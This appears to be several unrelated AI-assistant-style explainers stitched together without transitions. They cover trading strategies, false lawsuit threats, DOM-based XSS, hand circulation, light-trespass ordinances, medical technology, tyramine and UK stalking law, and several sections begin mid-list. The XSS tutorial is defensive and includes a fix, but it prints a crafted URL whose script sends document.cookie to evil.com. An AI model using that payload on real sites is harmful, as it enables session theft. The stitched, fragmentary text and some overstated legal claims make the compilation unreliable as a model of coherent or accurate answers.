Momentum trading is when traders spot a significant change in price or volume and buy that asset with the intent of riding the trend to an even higher point, in order to reap a gain. This form of trading frequently centers on news catalysts, earnings announcements, or other breaking news that can generate a rush in the marketplace.

Scalping refers to a fast day trading method that aims at catching small price changes during the day. Scalpers usually enter and exit a trade in a few seconds to a few minutes, making a few cents per transaction. It does not aim at large gains, but small gains which accumulate due to high trade frequency.

---

### 3. 💥 Breakout Trading
Breakout trading is a strategy adopted by ambitious traders who boldly go beyond the established price range of a security. By identifying support and resistance levels, breakout traders aim to capitalize on the strong momentum that follows a breakout from the range. The key setup is when price breaks a key resistance level on significantly elevated volume (150%+ of average), as volume is your confirmation that institutions are participating.

---

### 4. 🔄 Trend Following
With the trend-following strategy, you try to identify the price trend and exploit it accordingly. With this approach, you do not need to put too much energy into identifying the perfect highs and lows — approximate values are sufficient. The trend-following strategy is a good way for beginners to trade unleveraged assets first and switch to leveraged products later.

---

### 5. 📊 Range / Mean Reversion Trading
Mean reversion strategies profit from the market's tendency to return to average levels after extreme moves. Range trading strategies built on support and resistance work best when markets are consolidating.

### 6. 📰 News-Based Trading
This form of trading frequently centers on news catalysts, earnings announcements, or other breaking news. When a company announces unexpected profits or a significant contract, traders rush in as volume increases and price action catches fire.

Threatening to file a **civil** lawsuit against someone isn't a crime when it's a legitimate negotiation tactic to resolve a legal issue, such as a breach of contract. If your client has absolutely no intention of ever filing a lawsuit regardless of the nature of the response, and you still send the adversary a demand letter with a copy of the proposed suit or even the unsupported threat of a suit, that can rise to the level of a **false statement of fact**.

### 4. **Threatening Criminal Charges to Gain Civil Advantage**
The ABA Model Code of Professional Responsibility prohibited threats of criminal prosecution in order to gain an advantage in a civil matter, stating: "A lawyer shall not present, participate in presenting, or threaten to present criminal charges solely to obtain an advantage in a civil matter."

A person who threatens someone to file criminal charges is in violation of the law regardless of whether the person is a lawyer, debtor, or member of the public. For the public, threatening to press charges against someone to take advantage of the situation can be considered a crime.

The legality of a false lawsuit threat hinges on **intent and context**:

Sure! Let's walk through a great example of a subtle but very common and dangerous JavaScript vulnerability: **DOM-based Cross-Site Scripting (XSS)**.

---

## 🔓 Vulnerable Code

```javascript
// Reads a value from the URL query string and renders it on the page
const params = new URLSearchParams(window.location.search);
const username = params.get("name");

document.getElementById("greeting").innerHTML = "Hello, " + username + "!";
```

This looks completely harmless at first glance — it just grabs a name from the URL and says hello. But it has a **serious security hole**.

---

## 💥 The Attack

An attacker could craft a malicious URL like this:

```
https://yoursite.com/welcome?name=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

When a victim visits this link, the browser **executes the injected script**, which can steal their session cookie and send it to the attacker's server — silently, with no visible indication to the user.

---

## 🧠 Why It's Subtle

The danger lives in **one single property**: `.innerHTML`.

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The particularly sneaky part here is that JavaScript interacts with the Document Object Model (DOM) on a web page, allowing scripts to be embedded and executed on client computers — and while several different types of XSS attacks exist, what they all have in common is that they cause untrusted script to appear and run in the user's browser.

The code *works perfectly* in normal use — if a user visits `?name=Alice`, they just see "Hello, Alice!". A developer testing the feature would never notice the flaw. The vulnerability only manifests when **user-controlled input is injected unsanitized into the DOM**.

If XSS vulnerabilities aren't remediated, they can result in user data theft, account tampering, malware spreading, or remote control over a user's browser.

---

## ✅ The Fix

Replace `.innerHTML` with `.textContent`, which **never interprets its content as HTML or JavaScript**:

```javascript
const params = new URLSearchParams(window.location.search);
const username = params.get("name");

// ✅ Safe: treats the value as plain text, not HTML
document.getElementById("greeting").textContent = "Hello, " + username + "!";
```

Or, if you truly need to render HTML, sanitize the input first using a trusted library like **DOMPurify**:

```javascript
const safeUsername = DOMPurify.sanitize(username);
document.getElementById("greeting").innerHTML = "Hello, " + safeUsername + "!";
```

---

## 📋 Key Takeaways

| ❌ Dangerous | ✅ Safe |
|---|---|
| `element.innerHTML = userInput` | `element.textContent = userInput` |
| `document.write(userInput)` | Sanitize with DOMPurify first |
| Trusting URL/query params directly | Always validate & escape output |

Defending against XSS requires a combination of coding practices and browser defenses: never inject raw user input into HTML, sanitize input on arrival, and escape output in the proper context (HTML, attribute, JavaScript, etc.).

The golden rule: **never trust user input**, whether it comes from a form field, a URL parameter, or any other external source.

### 🏃 1. **Exercise Regularly**
Exercise on a regular basis — it enhances blood flow, improves circulation from the heart to the peripheries, helps reduce obesity, and regulates blood pressure. Regular physical activity, such as walking or yoga, helps keep blood flowing efficiently.

---

Gentle hand and wrist massages can stimulate circulation, and stretching your hands regularly also encourages blood flow. Try these specific moves:
- Make a gentle fist, hold for a few seconds, then release. Repeat 10–15 times to improve hand circulation.
- Wrist circles can help improve blood flow to your hands — hold your hand out in front of you and slowly rotate your wrist in a circular motion. Do ten circles in one direction, then switch. Repeat with your other hand.
- Arm circles are great for improving circulation in the shoulders, arms, and hands, keeping your upper extremities warmer.

---

### 💧 3. **Stay Hydrated**
Around half of your blood is made of water, so staying hydrated is key. If you're not drinking enough fluid, you will have less blood in your body, and your blood may also become thicker.

---

### 🥗 4. **Eat a Circulation-Boosting Diet**
Consuming a balanced diet rich in iron, omega-3 fatty acids, and vitamins can support healthy circulation. Decrease the intake of trans fatty acids and increase the intake of Omega-3 fatty acids from flaxseed oil, fish oils, extra virgin olive oil, and deep-sea cold-water fish such as mackerel, herring, salmon, and halibut.

---

### 🌶️ 5. **Try Cayenne Pepper**
Traditionally, cayenne pepper is known to improve circulation and blood flow throughout the body, especially to the peripheral blood vessels.

---

### ☕ 6. **Cut Back on Caffeine**
Decrease the consumption of tea, coffee, and caffeinated drinks such as cola and energy drinks, as caffeine constricts blood vessels and decreases peripheral circulation.

---

### 🚭 7. **Quit Smoking**
Nicotine constricts blood vessels, reducing blood flow and increasing the likelihood of cold hands. Quitting smoking and limiting alcohol can significantly improve blood flow and overall vascular health.

---

### 🧤 8. **Keep Warm**
Wear layers, including insulating gloves and thick socks, to help trap body heat and keep your hands and feet warm. Soaking hands in warm water also encourages blood flow.

---

### 🧘 9. **Manage Stress**
Relaxation techniques like deep breathing, meditation, and yoga can help reduce stress and improve circulation.

---

### 🧖 10. **Try Dry Skin Brushing**
Dry skin brushing can help improve circulation — using a vegetable bristle brush, begin brushing from the feet and work up towards the heart in a clockwise, circular motion. Avoid brushing over areas of varicose veins, thin skin, or open wounds.

---

### ⚠️ When to See a Doctor
While occasional cold hands may not be a cause for concern, persistent coldness, numbness, or color changes in your hands may indicate an underlying vascular condition, such as Raynaud's Disease. See a provider if your hands feel cold all the time, or if it feels like they take longer than they should to warm up.

Here is a comprehensive overview of what is available regarding **light intrusion** (also called light trespass) in municipal codes:

---

## 🔦 What Is Light Intrusion in Municipal Codes?

According to the Illuminating Engineering Society of America, light trespass complaints can usually be classified into two categories: unwanted light illuminating an area or property and excessive brightness in the normal field of vision.

The principal purpose of most lighting codes is to limit adverse impacts arising from the production and use of outdoor lighting on the general environment – that is, on the sky (sky glow), on other property (glare; light trespass), on the power grid (energy use and efficiency), or on ecosystems (disturbance to animals, insects, and plants).

---

## ⚖️ Legal Basis

The legal basis for regulating the use of private property in the U.S. was originally based in the common law concept of "nuisance." If one property owner uses their land in a way that interferes with the use and/or enjoyment of another, the affected party may be entitled to a legal claim of nuisance. Zoning laws or codes extend and improve the nuisance concept by providing proactive notice that certain uses are prohibited or limited on the basis of cross-boundary impacts.

Problems of glare from building reflections are generally regulated through building and zoning codes.

---

## 📋 How Municipal Codes Address Light Intrusion

### Placement in the Code
Lighting regulations can be located either in the zoning ordinance, the subdivision and land development ordinance, or in a separate lighting ordinance adopted according to the applicable municipal code.

### Common Regulatory Goals
Municipalities can use lighting ordinances to ensure safe, aesthetically pleasing, and energy-efficient lighting that preserves views of the night sky and minimizes harm to species disturbed by artificial lighting. Ordinances can accomplish this by mandating or encouraging the use of shielded light fixtures, intelligent timing controls, improved technology (such as LED lighting), and other methods.

### Shielding Requirements
Research shows that full shielding can reduce sky glow by 50% to over 90% when compared to a typical mix of partially shielded and unshielded lighting. As shielding dramatically reduces light trespass and glare as well, it is and should be the highest priority in lighting codes.

### Measurement Standards
Under some codes, no person shall construct, establish, create, or maintain any stationary exterior light source that may cause certain locations to be illuminated by more than two footcandles (21.5 lx) of lighting intensity or receive direct glare from the light source. For example, the San Luis Obispo Municipal Code specifies that no lighting on private property shall produce an illumination level greater than two maintained horizontal foot-candles at grade on any property within a residential zone except on the site of the light source.

### Orientation Rules
Outdoor lighting shall conform to orientation regulations, meaning it shall be directed downward and away from adjacent properties and public rights-of-way.

### Special Protected Areas
Some codes, such as Goldendale Municipal Code Ch. 15.52, aim to prevent excessive illumination, glare, and reflection in areas adjacent to astronomical research facilities, such as observatories, where such light intrusion would hinder use of sensitive optical devices.

---

## 🏙️ Examples of Specific Municipal Codes

- **Lynnwood, WA** (Municipal Code Sec. 17.05.110) declares any activity that produces enough light or glare beyond the parcel — including outdoor lighting, signage, sources of artificial illumination, and building materials with high light reflective qualities — as a nuisance.

- **Tumwater, WA** (Municipal Code Sec. 18.40.035) requires lights to be fully shielded and not result in light shining on other properties, in the sky, on the roads, and elsewhere, with a list of exceptions.

- **Lakewood, WA** (Municipal Code Sec. 18A.60.095) divides the city into three lighting zones, including coverage of Joint Base Lewis McChord, with recommendations for each zone depending on intensity and purpose of land use.

- **Los Angeles, CA** prohibits light sources that cause direct glare on any elevated habitable porch, deck, or balcony on any other property containing a residential unit or units.

---

## 🌙 Model Ordinances and Standards

DarkSky International has created free policy templates for lawmakers, municipal officials, and community advocates to assist in drafting U.S. state laws and local municipal codes that support responsible outdoor nighttime lighting. These templates are grounded in their Five Principles of Responsible Outdoor Lighting at Night and were written in collaboration with industry professionals, lighting designers, environmental ecologists, and city planners.

A model text for an outdoor night-lighting ordinance that cities and towns can use is also based on ordinances successfully implemented in Kennebunkport, Maine, and Tucson, Arizona.

---

## 🌿 Vermont State-Level Approach

Vermont's outdoor lighting law aims to develop voluntary guidelines for the design and installation of outdoor lighting to facilitate the use of lighting fixtures and design criteria that minimize the causes of sky glow, light trespass, and glare, while still providing a comfortable, visually effective, energy efficient, safe, and secure outdoor environment. It is also the intent to minimize the intrusion of lighting across property lines, thereby avoiding disruption of the quality of life for nearby government and nongovernment buildings and grounds and for private residences.

---

In summary, light intrusion is a well-recognized issue addressed through nuisance law, zoning ordinances, and specialized lighting codes at both local and state levels. Key tools include footcandle limits, full-cutoff shielding requirements, directional standards, and lighting zone classifications. Model ordinances from organizations like DarkSky International are widely available to help municipalities create enforceable regulations.

# 🏥 The Use of Advanced Technology in Medicine

The intersection of medicine and technology has entered what many experts describe as a golden age of innovation. The intersection of medicine and technology has produced remarkable innovations, fundamentally altering how diseases are detected, treated, and managed. Below is a comprehensive overview of the most transformative technologies reshaping modern healthcare.

---

## 🤖 1. Artificial Intelligence (AI) in Medicine

Artificial intelligence has transitioned from a research curiosity to a clinical necessity, with AI-powered diagnostic imaging achieving capabilities that complement — and in certain contexts exceed — human expert performance.

The U.S. Food and Drug Administration granted approval to over 500 AI-enabled medical devices by early 2025. AI is also revolutionizing cardiology: advanced algorithms can analyze heart data and identify early signs of treatable heart disease before the patients even know they're sick.

---

## 🧬 2. Gene Editing & CRISPR Technology

The gene-editing technology CRISPR-Cas9 has transitioned from a laboratory tool to clinical reality. For sickle cell disease, the therapy **Casgevy** edits patient stem cells to produce functional red blood cells, with initial clinical results showing patients remaining transfusion-free with functional cure rates exceeding 90%.

In a landmark case, a 6-month-old baby's liver cells were edited using CRISPR — the technology that won researchers the Nobel Prize in Chemistry in 2020 — to correct a unique genetic mutation.

---

## 🦾 3. Robotic Surgery

Robotics is dramatically enhancing surgical precision. Hospital systems can access databases of thousands of previous surgeries to power algorithms that visualize multiple permutations of a surgical procedure. This allows surgeons to customize a surgical plan and use tools specifically designed for the individual patient — or even use a digital copy of a patient's anatomy to rehearse a surgery ahead of time.

---

## 🩺 4. Wearable Health Technology

The advanced monitoring capabilities of wearable devices help physicians provide remote care for many patients, particularly those with chronic diseases. These devices — typically smart wristwatches — can track a range of data, including heart rate, blood oxygen saturation, and body temperature.

According to research published in *Diagnostics*, a wearable device that continuously collects ECG, skin impedance, temperature, and patient activity data can predict heart failure exacerbations within a **10-day window**, improving early intervention.

---

## 💊 5. Digital Pills & Ingestible Sensors

A digital pill (also known as an ingestible sensor or smart pill) is a pharmaceutical dosage form that contains an ingestible sensor inside of a pill. The sensor begins transmitting medical data after it is consumed. The technology and data transmitted by the pill's sensor are considered part of digital medicine.

These ingestible electronic capsules, equipped with cameras and sensors, are emerging as non-invasive tools for real-time monitoring of the gastrointestinal tract, facilitating early detection of abnormalities and improving diagnostic accuracy and patient comfort compared to traditional endoscopic procedures.

---

## 🧠 6. Neurotechnology & Pain Management

Medtronic unveiled a cutting-edge implantable medical device that can sense the body's biological signals as they travel to the brain along the spinal cord, and then automatically deliver electrical therapy that blocks pain signals before they reach the brain — a medical technology for pain treatment that can adjust to a person's needs up to **50 times per second**.

---

## 🎮 7. Virtual Reality (VR) in Medical Training

Doctors and medical students increasingly use VR for different purposes, from pain management as a distraction mechanism and surgical rehearsals to simulation training. A scoping review published in the *Journal of Advances in Medical Education & Professionalism* found that VR-based training improved learning outcomes in 17 studies, and 20 studies reported higher accuracy in medical practice among those trained with VR.

---

## 🧫 8. CAR-T Cell Therapy & Immunotherapy

The concept of harnessing the immune system to combat malignancies, once deemed speculative, is now a cornerstone of cancer treatment. Immunotherapy — particularly immune checkpoint inhibitors and CAR-T cell therapy — has revolutionized the prognosis for many cancers, offering durable remission in a subset of patients.

The American Society of Clinical Oncology reported that CAR-T therapy has been administered to over **50,000 patients globally**, with five-year survival data confirming durable remission.

---

## 🌍 9. Precision & Personalized Medicine

Precision medicine is an innovative disease prevention and treatment approach that considers an individual's unique genetic makeup, environment, and lifestyle. This approach allows doctors and researchers to predict more accurately which treatment and prevention strategies will work for certain diseases within specific groups of people.

---

## 🌐 10. Telemedicine & AI-Powered Remote Care

AI-powered portable diagnostic devices could bring advanced healthcare to underserved regions, while telemedicine platforms with real-time translation technologies might bridge geographical and linguistic divides.

---

## ⚖️ Challenges Ahead

Despite incredible progress, challenges remain. Technology alone does not constitute healthcare. The effective integration of these innovations into compassionate, equitable, human-centred care remains the defining challenge. The future of medicine is technological, but it must remain deeply human.

Yet these scientific advancements remain unevenly distributed. The COVID-19 pandemic starkly highlighted health inequities within and between nations.

---

## 🔮 Conclusion

Advanced technology is profoundly reshaping medicine — from AI diagnostics and CRISPR gene editing to robotic surgery and wearable health monitors. Artificial intelligence is becoming smarter, robots are more precise, and research is deeper than ever before. As these technologies mature, the goal is not only to innovate, but to ensure these breakthroughs are accessible to all of humanity.

# Effects of Tyramine

## What Is Tyramine?

Tyramine is a naturally occurring trace amine derived from the amino acid tyrosine. It is often found in fermented, aged, cured, and spoiled foods where microbes with decarboxylase enzymes convert the amino acid tyrosine into tyramine.

---

## Normal Physiological Effects

Tyramine helps the brain and nervous system function normally. As a biogenic amine, tyramine plays a role in the body's neurochemistry by influencing the release of neurotransmitters, such as norepinephrine, dopamine, and epinephrine.

Your adrenal glands generally respond to tyramine by sending catecholamines — fight-or-flight chemicals that act as both hormones and neurotransmitters — into your bloodstream. These catecholamines give you a boost of energy and, in turn, elevate your blood pressure and heart rate.

Notably, tyramine is unable to cross the blood-brain barrier, resulting in only non-psychoactive peripheral sympathomimetic effects following ingestion.

---

## Cardiovascular Effects

Excessive amounts of tyramine can displace endogenous stores of norepinephrine in the periphery, causing contraction of blood vessels, with a concomitant increase in blood pressure and cardiac output.

A large dietary intake of tyramine (or a dietary intake of tyramine while taking MAO inhibitors) can cause the tyramine pressor response, which is defined as an increase in systolic blood pressure of 30 mmHg or more.

The average person can consume about 400 mg of tyramine before observing a meaningful increase in blood pressure.

---

## Migraine Triggering

Although the mechanism is unclear, tyramine ingestion also triggers migraine attacks in sensitive individuals and can even lead to stroke. Vasodilation, dopamine, and circulatory factors are all implicated in the migraines, and double-blind trials suggest that the effects of tyramine on migraine may be adrenergic.

People with migraine are over-represented among those with inadequate natural monoamine oxidase, resulting in similar problems to individuals taking MAO inhibitors.

---

## Interaction with MAO Inhibitors (MAOIs)

MAOIs inhibit the activity of the enzyme monoamine oxidase, which breaks down tyramine in the body. If there is an excess of tyramine in the system, it can lead to a sudden and dangerous increase in blood pressure, posing serious health risks.

For people taking irreversible MAOIs, tyramine ingestions as low as 8–10 mg per serving can cause an increase in systolic blood pressure by 30 mmHg or greater, while the ingestion of ≤6 mg of tyramine per serving is generally considered safe.

Ingestion of high tyramine-containing foods in patients taking monoamine oxidase inhibitors produces headaches, blurry vision, chest pain, and palpitations associated with hypertension, intracranial hemorrhages, and myocardial injury.

---

## Symptoms of Excess Tyramine (Tyramine Toxicity)

Tyramine buildup may trigger migraine or elevate blood pressure levels. In severe cases, it may cause nosebleeds, anxiety, shortness of breath, or increased heart rate.

If you have amine intolerance, you may experience heart palpitations, headaches, vomiting, and nausea.

Signs and symptoms of high tyramine levels include:
- **Severe headache**
- **Chest pain**
- **Shortness of breath**
- **Increased blood pressure and heart rate**
- **Blurry vision**
- **Nausea and vomiting**

---

## Emerging Roles of Tyramine

New evidence suggests endogenous tyramine and other trace amines in lower physiologic levels may have additional roles, including modulating the immune system.

The function of trace amine-associated receptors (TAARs) is still being elucidated and is hypothesized to include olfaction, modulation of other neurotransmitters, regulation of body weight, and immunologic functions. TAAR1 signal transduction may modulate the reward circuits, the limbic system, and mood in the central nervous system.

---

## Who Should Be Most Cautious?

It's typically safe to consume for most, but some people may need to limit or avoid it, including MAOI users, people with a sensitivity to this compound, migraine sufferers, and individuals with certain heart or metabolic issues.

> ⚠️ **Important:** If you are on MAOIs or have high blood pressure and suspect tyramine sensitivity, consult your healthcare provider for personalized dietary guidance.

# UK Laws on Stalking

## Definition of Stalking

Stalking and harassment is when someone repeatedly behaves in a way that makes you feel scared, distressed or threatened. Stalking involves persistently following someone. It does not necessarily mean following them in person and can include watching, spying or forcing contact with the victim through any means, including through social media.

---

## Key Legislation

### 1. Protection from Harassment Act 1997
Harassment and stalking are classed as offences under the Protection from Harassment Act 1997 and (where the offending is racially or religiously aggravated) the Crime and Disorder Act 1998.

### 2. Protection of Freedoms Act 2012
The first major attempt to deal with stalking in England and Wales was the Protection from Harassment Act (1997), followed by the Protection of Freedoms Act (2012), which amended the previous act and introduced stalking as a specific offence. Prior to this, stalking was not explicitly stated in the legislation, and this limitation was highlighted by people subjected to stalking and victims' charities.

### 3. Stalking Protection Act 2019
Stalking Protection Orders (SPOs) are civil orders that can be used to impose restrictions and requirements on perpetrators. SPOs enable courts, at the request of the police, to ban stalkers from contacting victims and visiting certain locations, as well as requiring them to engage with professional help, including a mental health assessment. They were created by the Stalking Protection Act 2019.

---

## Stalking Offences

Stalking or harassment offences can be found in sections 2, 2A, 4 and 4A of the Protection from Harassment Act 1997 (PHA 1997) and section 42A(1) of the Criminal Justice and Police Act 2001.

There are two tiers of stalking offences:

- **Basic Stalking:** It's stalking if the unwanted behaviour has happened two times or more and made you feel scared, distressed or threatened.

- **Aggravated Stalking:** Stalking involving fear of violence or serious alarm or distress is a more serious offence. It involves two or more occasions that have caused the victim to fear violence will be used against them or had a substantial adverse effect on their day-to-day activities, even where the fear is not explicitly of violence.

### Examples of Stalking Behaviours
Examples of acts or omissions associated with stalking include monitoring the use by a person of the internet, email or any other form of electronic communication; loitering in any place (whether public or private); and interfering with any property in the possession of a person.

---

## Penalties and Sentences

- If found guilty, stalkers now face up to **10 years' imprisonment**. As well as this, they can receive indeterminate restraining orders which, if breached, can result in more prison time.

- For the **aggravated offence**, a person guilty of an offence under this section is liable on conviction on indictment to imprisonment for a term not exceeding **five years**, or a fine, or both; or on summary conviction to imprisonment for a term not exceeding twelve months, or a fine not exceeding the statutory maximum, or both.

- **Breaching a Stalking Protection Order:** Penalties for breaching an SPO include up to six months' imprisonment and/or an unlimited fine in the magistrates' court; or up to five years' imprisonment and/or an unlimited fine in the Crown Court.

---

## Stalking Protection Orders (SPOs)

The government has announced measures making it easier for police to apply for stalking protection orders, meaning more victims will be protected earlier.

Section 8 of the Stalking Protection Act 2019 makes it an offence for a person, without reasonable excuse, to breach a stalking protection order or an interim stalking protection order.

In December 2024, the government announced that SPOs would be made more widely available, with courts given the power to impose SPOs directly at conviction or acquittal.

---

## Restraining Orders

Restraining Orders (ROs) prevent domestic violence, stalking and harassment by prohibiting contact, prohibiting violence, intimidation and harassment, and banning the offender from certain places. They usually last between six and 12 months but can be made for an indefinite period and are renewable.

---

## Online Stalking

Online stalking or harassment is when someone monitors, stalks, harasses, threatens, controls or impersonates another person using the internet or other technology. The Online Safety Act also includes stalking offences in the list of specified 'priority offences'. Priority offences represent the most serious and prevalent illegal content and activity online, and companies will need to take proactive steps to tackle such content.

---

## Reporting Stalking

If you're experiencing domestic abuse-related stalking and harassment, you just need two incidents to be able to report it to the Police. You can do this via 101, their online service, or by visiting a Police station. If you're ever in an emergency situation, call 999 immediately.

---

> ⚠️ **Please Note:** This information is for general guidance only and does not constitute legal advice. If you are experiencing stalking or need legal guidance, please contact the Police or a qualified legal professional. Organisations like the **Suzy Lamplugh Trust** (National Stalking Helpline: 0808 802 0300) can also provide support.
